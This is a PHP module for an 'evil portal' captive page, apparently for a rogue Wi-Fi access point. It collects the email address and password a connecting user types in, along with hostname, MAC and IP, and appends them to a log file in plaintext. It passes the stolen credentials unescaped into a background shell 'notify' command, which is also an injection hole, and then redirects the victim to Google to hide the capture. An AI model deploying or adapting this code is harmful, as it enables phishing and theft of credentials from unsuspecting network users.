<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        if (isset($_POST['email'])) {
            $email = $_POST['email'];
            $pwd = $_POST['password'];
            $hostname = $_POST['hostname'];
            $mac = $_POST['mac'];
            $ip = $_POST['ip'];

            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());
            file_put_contents("{$logPath}/portal.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
            $this->execBackground("notify $email' - '$pwd");
        }
        
        // Ensure the client is written to the authorized file
        $clientIP = $_SERVER['REMOTE_ADDR'];
        $this->authorizeClient($clientIP);

        // Adding a delay of 1 second (you can adjust this as needed)
        sleep(1);

        // Redirect to Google
        header("Location: http://www.google.com");
        exit();
    }

    public function onSuccess()
    {
        parent::onSuccess();
    }

    public function showError()
    {
        parent::showError();
    }
    
    protected function authorizeClient($clientIP)
    {
        parent::authorizeClient($clientIP);

        // Verify that the client has been successfully written to the authorized clients file
        $retryCount = 0;
        $maxRetries = 5;
        $isAuthorized = false;

        while ($retryCount < $maxRetries && !$isAuthorized) {
            $isAuthorized = $this->isClientAuthorized($clientIP);
            if (!$isAuthorized) {
                sleep(1); // Wait for 1 second before retrying
                $retryCount++;
            }
        }
        
        return $isAuthorized;
    }
}
